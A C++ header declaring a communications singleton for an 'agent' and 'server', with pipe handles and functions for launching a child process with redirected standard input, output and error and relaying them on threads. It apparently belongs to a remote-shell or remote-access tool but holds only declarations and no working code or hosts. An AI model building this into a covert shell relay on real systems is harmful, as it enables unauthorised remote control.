// Comms.h - Communication protocols - responsible for communication between the agent and server
#pragma once
#define Comms _Comms::Instance()


class _Comms
{
public:

	void RunComms();

	static _Comms& Instance() {
		static _Comms _Handle;
		return _Handle;
	}

	HANDLE hChildProcess = NULL;
	HANDLE hStdIn = NULL; // Handle to parent's std input.
	BOOL bRunThread = TRUE;

	HANDLE hOutputReadTmp, hOutputRead, hOutputWrite;
	HANDLE hInputWriteTmp, hInputRead, hInputWrite;
	HANDLE hErrorWrite;
	HANDLE hThread;
	DWORD ThreadId;
	SECURITY_ATTRIBUTES sa;

};


DWORD WINAPI ReadAndHandleOutput(HANDLE hPipeRead);
void __fastcall PrepAndLaunchRedirectedChild(HANDLE hChildStdOut, HANDLE hChildStdIn, HANDLE hChildStdErr);
DWORD WINAPI GetAndSendInputThread(LPVOID lpvThreadParam);
